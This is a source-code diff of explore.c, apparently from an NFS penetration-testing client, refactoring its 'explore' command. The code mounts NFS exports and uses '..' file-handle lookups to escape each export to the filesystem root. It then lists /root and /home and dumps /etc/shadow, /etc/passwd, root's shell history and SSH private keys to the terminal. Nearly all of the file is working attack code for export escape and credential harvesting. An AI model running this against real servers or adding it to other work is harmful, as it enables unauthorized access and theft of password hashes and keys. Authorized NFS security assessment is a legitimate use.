@@ -1,5 +1,6 @@
 /*
- * Copyright (C)  2023-2024 Claes M Nyberg <cmn@signedness.org>
+ * Copyright (C)  2023-2026 Claes M Nyberg <cmn@signedness.org>
+ * Copyright (C)  2025-2026 John Cartwright <johnc@grok.org.uk>
  * All rights reserved.
  *
  * Redistribution and use in source and binary forms, with or without
@@ -12,9 +13,10 @@
  *    documentation and/or other materials provided with the distribution.
  * 3. All advertising materials mentioning features or use of this software
  *    must display the following acknowledgement:
- *      This product includes software developed by Claes M Nyberg.
- * 4. The name Claes M Nyberg may not be used to endorse or promote
- *    products derived from this software without specific prior written
+ *      This product includes software developed by Claes M Nyberg and
+ *      John Cartwright.
+ * 4. The names Claes M Nyberg and John Cartwright may not be used to endorse
+ *    or promote products derived from this software without specific prior written
  *    permission.
  *
  * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
@@ -30,373 +32,333 @@
  * SUCH DAMAGE.
  */
 
-#include <stdio.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <string.h>
+/*
+ * explore.c - Automatic filesystem exploration
+ *
+ * Provides the "explore" command for recursive enumeration of NFS exports.
+ * Mounts each share, traverses up to find root, then explores interesting
+ * directories like /etc, /root, /home.
+ */
+
 #include <errno.h>
-#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
 
-#include "nfscli.h"
 #include "ansicolors.h"
+#include "cmdparse.h"
+#include "display.h"
+#include "explore.h"
+#include "mount.h"
+#include "nfs.h"
+#include "nfs_cache.h"
+#include "nfs_escape.h"
+#include "nfscli.h"
+#include "pathctx.h"
+#include "print.h"
+#include "str.h"
+#include "transfer.h"
 
-/* Saved data */
-struct filedata {
-	uint8_t *data; 
-	uint64_t len;
+/*
+ * Lookup file in directory and print contents to terminal.
+ */
+static void
+showfile(struct nfsctx *ctx, const struct nfs_fh *dirfh, const char *name)
+{
+    struct nfs_lookup_res lu;
+    int64_t bytes;
+
+    print(V_INFO, ctx, "Attempting to show file %s\n", name);
+
+    memset(&lu, 0, sizeof(lu));
+    if (nfs_lookup(ctx, dirfh, name, &lu) < 0)
+        return;
+
+    bytes = transfer_download(ctx, lu.fh.data, lu.fh.len, 0, stdout, DL_NEWLINE);
+    if (bytes > 0)
+        printf("-- EOF\n");
+}
+
+/*
+ * Exploration targets - what to look for in a root filesystem
+ */
+#define EXPLORE_LIST  0x01 /* List directory contents */
+#define EXPLORE_FILES 0x02 /* Show specific files */
+
+static const char *ssh_files[] = {
+    "authorized_keys", "id_rsa", "id_rsa.pub",
+    "id_ed25519", "id_ed25519.pub", "known_hosts", NULL};
+static const char *etc_files[] = {"passwd", "master.passwd", "shadow", NULL};
+static const char *root_files[] = {".history", NULL};
+
+static const struct {
+    const char *path;
+    int flags;
+    const char **files;
+} targets[] = {
+    {"root", EXPLORE_LIST | EXPLORE_FILES, root_files},
+    {"root/.ssh", EXPLORE_LIST | EXPLORE_FILES, ssh_files},
+    {"home", EXPLORE_LIST, NULL},
+    {"etc", EXPLORE_FILES, etc_files},
 };
 
 /*
- * Print file to terminal
+ * Explore interesting directories from root filesystem.
  */
-static uint64_t
-printfile(struct nfsctx *ctx, uint8_t *fh, int fhlen, 
-	uint64_t len, struct filedata *save)
+static void
+explore_rootfs(struct nfsctx *ctx, const struct nfs_fh *rootfh, int use_colors)
 {
-	struct nfsv3_read_args args;
-	struct nfsv3_read_reply reply;
-	uint64_t off;
-	uint64_t tot;
+    struct nfs_fh fh;
+    const char **fp;
+    size_t i;
+    int flags = use_colors ? ATTRSTR_COLORS : 0;
+    int saved_quiet;
 
+    saved_quiet = ctx->quiet;
+    ctx->quiet = 1;
 
-	off = 0;
-	tot = 0;
-	memset(&args, 0x00, sizeof(struct nfsv3_read_args));
-	memcpy(args.fh, fh, fhlen);
-	args.fhlen = fhlen;
+    for (i = 0; i < sizeof(targets) / sizeof(targets[0]); i++) {
+        if (path_walk(ctx, rootfh, targets[i].path, &fh) < 0)
+            continue;
 
-    do {
-        args.offset = off;
-        args.count = IOBUFSIZE;
-
-        memset(&reply, 0x00, sizeof(struct nfsv3_read_reply));
-
-        if (nfsv3_read(ctx, &args, &reply) < 0) {
-			fprintf(stderr, "** fwrite(): %s\n", strerror(errno));
-            goto finished;
+        if (targets[i].flags & EXPLORE_LIST) {
+            print(V_INFO, ctx, "Listing /%s\n", targets[i].path);
+            list_dir_plus(ctx, flags, fh.data, fh.len);
         }
 
-        if (reply.buf != NULL) {
-            free(reply.buf);
-            reply.buf = NULL;
+        if ((targets[i].flags & EXPLORE_FILES) && targets[i].files) {
+            for (fp = targets[i].files; *fp; fp++)
+                showfile(ctx, &fh, *fp);
         }
+    }
 
-        if (fwrite(reply.data, reply.len, 1, stdout) != 1) {
-			fprintf(stderr, "** fwrite(): %s\n", strerror(errno));
-            goto finished;
-        }
-
-        off += args.count;
-        tot += args.count;
-    } while (reply.eof != 1);
-
-    printf("\n-- EOF\n");
-
-finished:
-	if ((save != NULL) && (reply.buf != NULL)) {
-		save->data = reply.buf;
-		save->len = reply.len;
-
-		reply.buf = NULL;
-		reply.len = 0;
-
-	}
-
-    if (reply.buf != NULL)
-        free(reply.buf);
-
-    return tot;
+    ctx->quiet = saved_quiet;
 }
 
 /*
- * Attempt to LOOKUP file inside directory and print it to terminal
- * Return the number of bytes read in file
- */
-static uint64_t
-showfile(struct nfsctx *ctx, uint8_t *dirfh, int dirfhlen, 
-	char *name, struct filedata *save)
-{
-	struct lookup_ret lu;
-
-	if (save != NULL)
-		memset(save, 0x00, sizeof(struct filedata));
-
-	print(0, ctx, "Attempting to show file %s\n", name);
-	if (nfsv3_lookup(ctx, dirfh, dirfhlen, name, &lu) == 0) {
-		return printfile(ctx, lu.fh, lu.fhlen, lu.obj_attr.size, save);
-	}
-
-	return 0;
-}
-
-/*
- * Attempt to explore interesting directories and folders 
- * from root file system. on a UNIX OS.
- * Return 1 if root fs was found, 0 otherwise.
+ * Find the topmost directory from the shared path.
+ * Uses nfs_probe_escape_one() to try both LOOKUP and READDIRPLUS methods.
+ * Returns file handle length on success, -1 on error.
  */
 static int
-explore_rootfs(struct nfsctx *ctx, uint8_t *fh, int fhlen)
+find_topdir(struct nfsctx *ctx, struct mount_export *share,
+    struct nfs_fh *out_fh, int use_colors)
 {
-	struct lookup_ret etc;
-	struct lookup_ret lu;
+    struct nfs_fh curr;
+    struct nfs_fh parent;
+    struct nfs_escape_diag diag;
+    char hexbuf[NFS_FHSIZE_MAX * 2 + 1];
+    int is_v3, ret, depth, level;
+    int flags = use_colors ? ATTRSTR_COLORS : 0;
+    size_t plen;
 
-	/* /etc */
-	print(0, ctx, "Attempting to explore /etc\n");
-	if (nfsv3_lookup(ctx, fh, fhlen, "etc", &etc) == 0) {
-		print(0, ctx, "%sFOUND POSSIBLE ROOT FS%s\n", COLOR_RED, COLOR_RESET);
-	}
+    print(V_INFO, ctx, "Listing directories for share %s%s%s\n",
+        COLOR_BOLD, share->name, COLOR_RESET);
 
-	else {
-		print(0, ctx, "Failed to lookup /etc, this is probably not a root FS\n");
-		return 0;
-	}
+    nfs_fh_from_buf(&curr, share->fh, share->fhlen);
+    is_v3 = ctx->proto.nfs_version >= 3;
+    depth = path_count_components(share->name);
 
-	/* /root */
-	if (nfsv3_lookup(ctx, fh, fhlen, "root", &lu) == 0) {
-		struct lookup_ret lu2;
+    for (level = 0; level <= depth; level++) {
+        /* List current directory */
+        if (is_v3)
+            list_dir_plus(ctx, flags, curr.data, curr.len);
+        else
+            list_dir(ctx, flags, curr.data, curr.len);
 
-		print(0, ctx, "Attempting to list /root/\n");
-		nfsv3_readdirplus(ctx, ATTRSTR_COLORS, lu.fh, lu.fhlen);
-		showfile(ctx, lu.fh, lu.fhlen, ".history", NULL);
+        /* Done if we've traversed all levels */
+        if (level == depth)
+            break;
 
-		/* List .ssh files */
-		if (nfsv3_lookup(ctx, lu.fh, lu.fhlen, ".ssh", &lu2) == 0) {
-			print(0, ctx, "Attempting to list /root/.ssh\n");
-			nfsv3_readdirplus(ctx, ATTRSTR_COLORS, lu2.fh, lu2.fhlen);
-			showfile(ctx, lu2.fh, lu2.fhlen, "authorized_keys", NULL);
-			showfile(ctx, lu2.fh, lu2.fhlen, "id_rsa", NULL);
-			showfile(ctx, lu2.fh, lu2.fhlen, "id_rsa.pub", NULL);
-			showfile(ctx, lu2.fh, lu2.fhlen, "id_ed25519", NULL);
-			showfile(ctx, lu2.fh, lu2.fhlen, "id_ed25519.pub", NULL);
-			showfile(ctx, lu2.fh, lu2.fhlen, "known_hosts", NULL);
-		}
-	}
+        plen = path_prefix_len(share->name, depth - level - 1);
+        print(V_INFO, ctx, "Escaping to %.*s\n",
+            (int)plen, share->name);
+        print(V_INFO, ctx, "Current:         FH:%s\n",
+            str_hex(curr.data, curr.len, hexbuf, sizeof(hexbuf)));
 
-	/* /home */
-	if (nfsv3_lookup(ctx, fh, fhlen, "home", &lu) == 0) {
-		print(0, ctx, "Attempting to list /home\n");
-		nfsv3_readdirplus(ctx, ATTRSTR_COLORS, lu.fh, lu.fhlen);
-	}
+        /* Try to escape one level up */
+        ret = nfs_probe_escape_one(ctx, &curr, &parent, &diag);
 
-	/* Save /etc for last */
-	if (etc.fhlen) {
-		showfile(ctx, etc.fh, etc.fhlen, "passwd", NULL); 
-		showfile(ctx, etc.fh, etc.fhlen, "master.passwd", NULL); 
-		showfile(ctx, etc.fh, etc.fhlen, "shadow", NULL); 
-	}
+        /* Print diagnostic info - show what was tried */
+        if (is_v3 && diag.rdp_tried) {
+            if (diag.rdp_got_fh)
+                print(V_INFO, ctx, "(READDIRPLUS) .. FH:%s\n",
+                    str_hex(diag.rdp_fh.data, diag.rdp_fh.len, hexbuf, sizeof(hexbuf)));
+            else
+                print(V_INFO, ctx, "(READDIRPLUS) .. (no FH)\n");
+        }
+        if (diag.lu_tried) {
+            if (diag.lu_got_fh)
+                print(V_INFO, ctx, "(LOOKUP)      .. FH:%s\n",
+                    str_hex(diag.lu_fh.data, diag.lu_fh.len, hexbuf, sizeof(hexbuf)));
+            else
+                print(V_INFO, ctx, "(LOOKUP)      .. (no FH)\n");
+        }
 
-	return 1;
+        if (ret <= 0) {
+            /* Hit ceiling early - can't escape further */
+            plen = path_prefix_len(share->name, depth - level);
+            print(V_INFO, ctx, "Cannot escape above %.*s\n",
+                (int)plen, share->name);
+            print(V_INFO, ctx, "Done trying to list top directory for share %s%s%s\n",
+                COLOR_BOLD, share->name, COLOR_RESET);
+            nfs_fh_copy(out_fh, &curr);
+            return 0; /* Did not reach root */
+        }
+
+        /* Move up */
+        nfs_fh_copy(&curr, &parent);
+    }
+
+    /* Reached root */
+    print(V_INFO, ctx, "%sReached root filesystem%s\n", COLOR_BRED, COLOR_RESET);
+    print(V_INFO, ctx, "Done trying to list top directory for share %s%s%s\n",
+        COLOR_BOLD, share->name, COLOR_RESET);
+
+    nfs_fh_copy(out_fh, &curr);
+    return curr.len;
 }
-
-
-/*
- * Find the top most directory from the shared path.
- * Return the langth of the file handle on success, 
- * with the file handle copied to fhsave (which must 
- * have at least FHMAXLEN bytes of memory) -1 on error.
- */
-static int
-find_topdir(struct nfsctx *ctx, struct export_reply *share, uint8_t *fhsave)
-{
-	struct lookup_ret lu;
-	uint8_t buf[1024];
-	uint8_t rp[FHMAXLEN];
-	int rplen;
-	uint8_t curr[FHMAXLEN];
-	int currlen;
-
-	print(0, ctx, "Listing directories for share %s%s%s\n", 
-		COLOR_BOLD, share->name, COLOR_RESET);
-
-	memcpy(curr, share->fh, share->fhlen);
-	currlen = share->fhlen;
-	while (1) {
-		/* List current directory */
-		nfsv3_readdirplus(ctx, ATTRSTR_COLORS, curr, currlen);
-		
-		print(0, ctx, "Using READDIRPLUS and LOOKUP to get file handle for ..\n");
-		print(0, ctx, "Current        . FH:%s\n", str_hex(curr, currlen, 
-			(char *)buf, sizeof(buf)));
-
-		if ( (rplen = nfsv3_readdirplus_dotdot(ctx, curr, currlen, rp)) > 0) {
-			print(0, ctx, "(READDIRPLUS) .. FH:%s\n", str_hex(rp, rplen, 
-				(char *)buf, sizeof(buf)));
-		}
-
-		if (nfsv3_lookup(ctx, curr, currlen, "..", &lu) == 0) {
-			print(0, ctx, "(LOOKUP)      .. FH:%s\n", str_hex(lu.fh, lu.fhlen, 
-				(char *)buf, sizeof(buf)));
-		}
-
-		if ((rplen > FHMAXLEN) || (lu.fhlen > FHMAXLEN)) {
-			fprintf(stderr, "** Error: Returned file handle length exceeds %u\n", FHMAXLEN);
-			return -1;
-		}
-
-		/*
-		 * Now, time to find a candidate for listing ..
-		 */
-
-		/* If READDIRPLUS .. equals current dir, ignore it */
-		if (rplen == currlen) {
-			if (memcmp(rp, curr, currlen) == 0) {
-				print(0, ctx, "READDIRPLUS equals current, ignoring\n");
-				rplen = 0;
-			}
-		}
-
-		/* If LOOKUP .. equals current dir, ignore it */
-		if (lu.fhlen == currlen) {
-			if (memcmp(lu.fh, curr, currlen) == 0) {
-				print(0, ctx, "LOOKUP equals current, ignoring\n");
-				lu.fhlen = 0;
-			}
-		}
-
-		/* If LOOKUP and READDIRPLUS are equal, just pick one */
-		if ((lu.fhlen > 0) && (rplen > 0)) {
-			if (rplen == lu.fhlen) {
-				if (memcmp(lu.fh, rp, lu.fhlen) == 0) {
-					print(0, ctx, "LOOKUP equals READDIRPLUS, picking one\n");
-					memcpy(curr, rp, rplen);
-					currlen = rplen;
-					continue;
-				}
-			}	
-		}
-
-		/* READDIRPLUS must differ from current at this point */
-		if (rplen > 0) {
-			print(0, ctx, "Trying READDIRPLUS FH\n");
-			memcpy(curr, rp, rplen);
-			currlen = rplen;
-			continue;
-		}
-
-		/* LOOKUP must differ from current at this point */
-		if (lu.fhlen > 0) {
-			print(0, ctx, "Trying LOOKUP FH\n");
-			memcpy(curr, lu.fh, lu.fhlen);
-			currlen = lu.fhlen;
-			continue;
-		}
-
-		/* No more candidate */
-		break;
-	}
-
-	print(0, ctx, "Done trying to list top directory for share %s%s%s\n", 
-		COLOR_BOLD, share->name, COLOR_RESET);
-	
-	if (fhsave != NULL) 
-		memcpy(fhsave, curr, currlen);
-	return currlen;
-}
-
 
 int
 cmd_explore(struct nfsctx *ctx, int argc, char **argv)
 {
-	struct export_reply *xpl;
-	struct export_reply *shares;
-	int opt;
-	uint8_t fh_all;
-	size_t tablen;
-	int rootfs;
+    struct mount_export *xpl, *shares, *tmp;
+    struct parsed_args pa;
+    struct nfs_fh topfh;
+    int use_colors, fh_all;
+    int saved_quiet;
+    size_t tablen;
 
-	rootfs = 0;
-	fh_all = 0;
-	while ( (opt = getopt(argc, argv, "a")) != -1) {
-		switch (opt) {
-			case 'a': /* Attempt to resolve all file handles, for all shares */
-				fh_all = 1;
-				break;
+    if (parse_cmdline(argc, argv, "a", 0, 0, &pa) < 0)
+        return -1;
 
-			default:
-				print(0, ctx, "** Error: %s: Unknown option '%c'\n", argv[0], optopt);
-				errno = EINVAL;
-				return -1;
-			break;
-		}
-	}
+    use_colors = ctx->term.use_colors;
+    fh_all = strchr(pa.opts, 'a') != NULL;
 
-	/* First resolve the mount port if it has not been set */
-	if (ctx->port_mountd == 0) {
-		int port;
-	
-		print(0, ctx, "Port unknown for mount service, attempting to resolve\n");
-		if ( (port = portmap_getport_mountd(ctx)) <= 0) 
-			return -1;
-		ctx->port_mountd = port;
-	}
+    /* Resolve mount port if needed */
+    if (ctx->ports.mountd == 0) {
+        print(V_INFO, ctx, "Port unknown for mount service, attempting to resolve\n");
+        init_mount_version(ctx);
+        if (ctx->ports.mountd == 0) {
+            fprintf(stderr, "*** mount service unavailable\n");
+            return -1;
+        }
+    }
 
-	/* Get a list of shares */
-	print(0, ctx, "Mount port resolved to %d\n", ntohs(ctx->port_mountd));
-	print(0, ctx, "Retrieving list of shares\n");
-	if (mount_export(ctx, &shares) < 0)
-		return -1;
+    /* Check if NFS service is available before doing any work */
+    if (!nfs_service_available(ctx)) {
+        fprintf(stderr, "*** NFS service unavailable on %s\n",
+            ctx->server.name ? ctx->server.name : "server");
+        return -1;
+    }
 
-	/* Print all shares */
-#define TABALIGN    48
-	xpl = shares;
-	while (xpl != NULL) {
-		printf("%s ", xpl->name);
-		for (tablen=strlen(xpl->name); tablen < TABALIGN; tablen++)
-			printf("_");
-		printf(" %s\n", xpl->group);
-		xpl = xpl->next;
-	}
+    /* Clear caches to ensure fresh probing each run */
+    nfs_cache_invalidate_all(ctx);
+    nfs_parent_cache_clear();
 
-	print(0, ctx, "Attempting to resolve file handles\n");
-	xpl = shares;
-	while (xpl != NULL) {
+    /* Get list of shares */
+    print(V_INFO, ctx, "Mount port resolved to %u\n", ntohs(ctx->ports.mountd));
+    print(V_INFO, ctx, "Retrieving list of shares\n");
+    if (mount_get_exports(ctx, &shares) < 0)
+        return -1;
 
-		if (fh_all || xpl->everyone) {
-			ACOLOR_SET(COLOR_BOLD);
-			printf("%s ", xpl->name);
-			for (tablen=strlen(xpl->name); tablen < TABALIGN; tablen++)
-				printf("_");
-			printf(" ");
-			ACOLOR_RESET();
-			fflush(stdout);
-			if ((xpl->fhlen = mount_mount(ctx, xpl->name, &xpl->fh)) > 0) {
-				printf("FH:");
-				ACOLOR_SET(COLOR_BRED);
-				HEXDUMP(xpl->fh, xpl->fhlen);
-				ACOLOR_RESET();
-			}
-		}
-		
-		xpl = xpl->next;
-	}
+    /* Print all shares */
+    for (xpl = shares; xpl != NULL; xpl = xpl->next) {
+        printf("%s ", xpl->name);
+        for (tablen = strlen(xpl->name); tablen < TABALIGN; tablen++)
+            putchar('_');
+        printf(" %s\n", xpl->group);
+    }
 
-	print(0, ctx, "Sending UMNTALL command to clear us from client list\n");
-	mount_umntall(ctx);
+    /* Check if any shares are accessible */
+    if (!fh_all) {
+        int has_everyone = 0;
+        for (xpl = shares; xpl != NULL; xpl = xpl->next) {
+            if (xpl->everyone) {
+                has_everyone = 1;
+                break;
+            }
+        }
+        if (!has_everyone) {
+            print(V_INFO, ctx, "No world-accessible shares (use -a to try all)\n");
+            /* Free shares list and return */
+            for (xpl = shares; xpl != NULL;) {
+                tmp = xpl->next;
+                free(xpl);
+                xpl = tmp;
+            }
+            return 0;
+        }
+    }
 
-	/* 
-	 * Attempt to list the topmost directory in each share that we have
-	 * the file handle for, using both lookup and readdirplus to resolve
-	 * the handle for ".." 
-	 */
-	xpl = shares;
-	while (xpl != NULL) {
-		uint8_t fh[FHMAXLEN];
-		int fhlen;
-	
-		if (xpl->fhlen > 0)  {
-			if ( (fhlen = find_topdir(ctx, xpl, fh)) > 0) {
-				/* Explore root fs the first time it is encountered */
-				if (rootfs == 0) {
-					if (explore_rootfs(ctx, fh, fhlen) == 1)
-						rootfs = 1;
-				}
-			}
-		}
+    /* Mount accessible shares and print file handles */
+    print(V_INFO, ctx, "Mounting filesystems\n");
+    saved_quiet = ctx->quiet;
+    ctx->quiet = 1; /* Suppress internal mount errors */
 
-		xpl = xpl->next;
-	}
+    for (xpl = shares; xpl != NULL; xpl = xpl->next) {
+        if (fh_all || xpl->everyone) {
+            if (use_colors)
+                printf(COLOR_BOLD);
+            printf("%s ", xpl->name);
+            for (tablen = strlen(xpl->name); tablen < TABALIGN; tablen++)
+                putchar('_');
+            printf(" ");
+            if (use_colors)
+                printf(COLOR_RESET);
+            fflush(stdout);
 
+            xpl->fh = malloc(NFS_FHSIZE_MAX);
+            if (xpl->fh != NULL) {
+                xpl->fhlen = mount_mnt_cached(ctx, xpl->name, xpl->fh, NFS_FHSIZE_MAX, 0);
+                if (xpl->fhlen > 0) {
+                    printf("FH:");
+                    if (use_colors)
+                        printf(COLOR_BRED);
+                    HEXDUMP(xpl->fh, xpl->fhlen);
+                    if (use_colors)
+                        printf(COLOR_RESET);
+                } else {
+                    int err = errno;
+                    free(xpl->fh);
+                    xpl->fh = NULL;
+                    xpl->fhlen = 0;
+                    printf("Mount failed (%s)\n", strerror(err));
+                }
+            }
+        }
+    }
+
+    ctx->quiet = saved_quiet;
+
+    /* Clear us from client list */
+    print(V_INFO, ctx, "Sending UMNTALL command to clear us from client list\n");
+    saved_quiet = ctx->quiet;
+    ctx->quiet = 1;
+    if (mount_umntall(ctx) < 0) {
+        ctx->quiet = saved_quiet;
+        print(V_INFO, ctx, "UMNTALL not supported, using individual UMNT calls\n");
+        for (tmp = shares; tmp != NULL; tmp = tmp->next) {
+            if (tmp->fhlen > 0)
+                mount_umnt(ctx, tmp->name);
+        }
+    } else {
+        ctx->quiet = saved_quiet;
+    }
+
+    init_nfs_version(ctx);
+
+    /* Traverse each share to find filesystem root and explore */
+    for (xpl = shares; xpl != NULL;) {
+        if (xpl->fhlen > 0) {
+            if (find_topdir(ctx, xpl, &topfh, use_colors) > 0)
+                explore_rootfs(ctx, &topfh, use_colors);
+        }
+
+        tmp = xpl->next;
+        free(xpl->fh);
+        free(xpl);
+        xpl = tmp;
+    }
 
     return 0;
 }
-
